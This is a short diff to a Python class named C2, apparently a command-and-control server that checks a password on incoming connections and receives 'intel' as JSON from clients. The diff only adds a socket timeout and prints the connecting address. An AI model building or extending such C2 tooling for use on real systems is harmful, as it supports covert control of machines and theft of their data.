@@ -15,7 +15,7 @@ class C2():
         self.keepAliveSleepInterval = 5
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-
+        self.s.settimeout(5)
     def load_modules(self, path):
         sys.path.append(path)
         modules = {}
@@ -34,6 +34,7 @@ class C2():
 
     def accept_conn(self):
         conn, address = self.s.accept()
+        print(address)
         if conn.recv(36).decode() == self.PASS:
             intel = conn.recv(1024).decode()
             intel = json.loads(intel)
